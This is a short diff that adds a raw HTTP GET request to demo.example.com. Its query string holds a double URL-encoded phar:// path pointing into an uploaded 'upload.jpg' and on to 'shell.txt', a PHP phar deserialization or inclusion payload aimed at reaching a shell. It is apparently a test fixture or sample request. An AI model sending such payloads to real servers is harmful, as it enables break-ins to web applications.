@@ -1,0 +1,4 @@
+GET /a?s=phar%253A%252F%252Ftmp%252Fupload.jpg%252Fshell.txt HTTP/1.1
+Host: demo.example.com
+Connection: close
+
